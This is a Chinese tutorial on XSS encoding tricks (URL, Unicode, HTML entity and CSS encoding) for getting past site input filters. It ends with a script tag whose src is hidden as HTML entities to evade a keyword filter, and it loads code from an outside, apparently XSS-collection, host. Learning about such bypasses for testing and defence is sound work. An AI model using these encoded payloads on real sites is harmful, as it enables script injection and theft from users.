# XSS编码与绕过

![](/attackUsers/xss/image/xss-17.png)

---

## 01. URL编码
URL只允许用US-ASCII字符集中可打印的字符(0×20—0x7x)，其中某些字符在HTTP协议里有特殊的意义，所以有些也不能使用。这里有个需要注意的，+加号代表URL编码的空格，%20也是。

URL编码最长见的是在用GET/POST传输时，顺序是把字符改成%+ASCII两位十六进制(先把字符串转成ASCII编码，然后再转成十六进制)。

这个在编码DOM XSS可能会用到，比如我上次说的`<<XSS分类与漏洞挖掘>>`0×04节DOM XSS 在chrome maxthon firefox里对URL里的a=后面的字节进行了URL进行编码，只能在360浏览器里成功，这就是浏览器对URL进行了URL编码。

## 02. unicode编码
Unicode有1114112个码位，也就是说可以分配1114112个字符。Unicode编码的字符以%u为前缀，后面是这个字符的十六进制unicode的码点。

Unicode编码之所以被本文提到，因为有的站点过滤了某些字符串的话，但是发现这个站点在后端验证字符串的时候，识别unicode编码，那我们就可以把我们的攻击代码来改成unicode编码形式，就可以绕过站点的过滤机制了。

## 03. HTML编码
HTML编码的存在就是让他在代码中和显示中分开， 避免错误。他的命名实体：构造是&加上希腊字母，字符编码：构造是&#加十进制、十六进制ASCII码或unicode字符编码，而且浏览器解析的时候会先把html编码解析再进行渲染。但是有个前提就是必须要在“值”里，比如属性src里，但却不能对src进行html编码。不然浏览器无法正常的渲染。

例如：
```html
<img src=&#108;&#111;&#103;&#111;&#46;&#112;&#110;&#103;/>
```

可以正常显示。

但是当你把src或者img进行html编码就不行了

例如：
```html
img &#115;&#114;&#99;=&#108;&#111;&#103;&#111;&#46;&#112;&#110;&#103;/>
```

## 04. CSS编码
这个不是太常用。就是/斜杠加上1-6位十六进制

之前在IE5之前都可以用expression来调用js时，这个编码很有用。 现在大多都是用于CSS小图标。

## 05. 假设
网站检测script标签里的src值是否为网站(关键字有`http&https&com&cn&net&&js`)

那我们该怎么绕过呢，看下面的实例代码：

```html
<script
src="&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#120;&#115;&#115;&#56;&#46;&#112;&#119;&#47;&#98;&#103;&#70;&#102;&#66;&#120;&#63;&#49;&#52;&#49;&#57;&#50;&#50;&#57;&#53;&#54;&#53;"></script>

```